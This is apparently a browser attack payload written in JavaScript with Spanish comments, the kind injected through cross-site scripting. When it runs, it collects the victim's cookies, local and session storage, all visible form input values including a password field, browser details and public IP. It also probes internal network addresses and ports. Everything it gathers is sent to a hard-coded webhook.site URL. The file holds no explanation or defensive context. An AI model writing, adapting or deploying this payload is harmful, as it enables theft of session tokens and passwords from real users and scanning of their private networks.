
// =======================
// payload_webhook_sensitive_extended.js
// =======================

const EXFIL_URL = 'https://webhook.site/90e1ad6d-3d2e-48a9-8c70-e9e76d9ea291';

// Enviar datos a Webhook.site
function exfiltrar(data) {
  fetch(EXFIL_URL, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  });
}

// 1. Cookies
function robarCookies() {
  if (document.cookie) {
    exfiltrar({tipo: 'cookies', data: document.cookie});
  }
}

// 2. Storage (local y session)
function robarStorage() {
  exfiltrar({
    tipo: 'storage',
    localStorage: {...localStorage},
    sessionStorage: {...sessionStorage}
  });
}

// 3. Info del navegador + inputs visibles
function infoNavegadorEInputs() {
  const inputs = [];
  document.querySelectorAll('input, textarea, select').forEach(el => {
    if (el.offsetParent !== null) {
      inputs.push({
        name: el.name || null,
        id: el.id || null,
        type: el.type || el.tagName,
        value: el.value || null
      });
    }
  });

  const pwField = document.querySelector('#password2');

  exfiltrar({
    tipo: 'navegador+inputs',
    location: window.location.href,
    referrer: document.referrer,
    userAgent: navigator.userAgent,
    plataforma: navigator.platform,
    idioma: navigator.language,
    inputs,
    password2: pwField ? pwField.value : null
  });
}

// 4. IP pública
function obtenerIPPublica() {
  fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => exfiltrar({tipo: 'ip_publica', ip: data.ip}))
    .catch(() => {});
}

// 5. Escaneo de red interna
function escanearRedInterna() {
  const ips = [
    '192.168.0.1', '192.168.1.1', '10.0.0.1', '10.0.0.2',
    '172.16.0.1', '172.17.0.1', '127.0.0.1', 'localhost'
  ];
  const puertos = [80, 443, 8080, 8443, 3000];

  ips.forEach(ip => {
    puertos.forEach(puerto => {
      const img = new Image();
      img.src = `http://${ip}:${puerto}/favicon.ico`;
      img.onload = () => {
        exfiltrar({tipo: 'puerto_abierto', ip, puerto});
      };
    });
  });
}

// === Ejecutar todo ===
robarCookies();
robarStorage();
infoNavegadorEInputs();
obtenerIPPublica();
escanearRedInterna();
